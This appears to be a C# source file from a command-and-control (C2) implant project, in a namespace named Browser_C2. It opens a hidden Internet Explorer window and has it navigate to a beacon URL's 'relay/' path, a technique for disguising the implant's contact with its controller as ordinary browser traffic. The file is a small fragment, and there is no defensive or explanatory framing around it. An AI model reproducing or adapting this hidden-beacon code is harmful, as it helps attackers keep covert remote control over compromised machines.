using System;
using System.Diagnostics;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Threading;

namespace Browser_C2
{
    

    class Browser
    {
        public static void StartBrowser()
        {

            SHDocVw.InternetExplorer IE = new SHDocVw.InternetExplorer();
            object Empty = 0;
            object URL = Program.BeaconURL + "relay/";
            IE.Visible = false;
            IE.Navigate2(ref URL, ref Empty, ref Empty, ref Empty, ref Empty);
            


         

        }

    }
}